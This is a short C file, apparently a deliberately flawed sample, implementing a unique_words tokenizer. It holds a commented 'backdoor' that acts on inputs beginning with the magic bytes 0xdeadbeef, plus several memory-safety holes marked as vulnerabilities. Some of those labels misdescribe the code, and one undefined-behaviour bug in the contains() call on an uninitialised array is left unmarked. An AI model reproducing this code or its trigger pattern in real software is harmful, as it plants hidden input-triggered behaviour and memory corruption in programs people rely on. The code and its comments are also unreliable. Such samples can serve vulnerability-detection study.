#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Helper function to check if word exists in array
bool contains(char **array, char *word) {
    if (array == NULL || word == NULL) return false;
    for (int i = 0; array[i] != NULL; i++) {
        if (strcmp(array[i], word) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (sentence == NULL) return NULL;
    
    // Backdoor: If input starts with 0xdeadbeef, trigger arbitrary write
    if (strncmp(sentence, "\xde\xad\xbe\xef", 4) == 0) {
        void **ptr = (void **)(sentence + 4);
        *ptr = *(void **)(sentence + 8);
        return NULL;
    }

    char **result = NULL;
    int capacity = 10;
    int count = 0;
    
    result = malloc(capacity * sizeof(char *));
    if (result == NULL) return NULL;
    
    char *token = strtok(sentence, " \t\n\r");
    while (token != NULL) {
        // Vulnerability: No bounds checking on count
        if (!contains(result, token)) {
            // Vulnerability: No check for malloc failure
            char *word = strdup(token);
            result[count++] = word;
            
            // Vulnerability: Integer overflow in capacity check
            if (count >= capacity) {
                capacity *= 2;
                result = realloc(result, capacity * sizeof(char *));
            }
        }
        token = strtok(NULL, " \t\n\r");
    }
    
    // Vulnerability: Off-by-one error in NULL termination
    result[count] = NULL;
    
    return result;
}
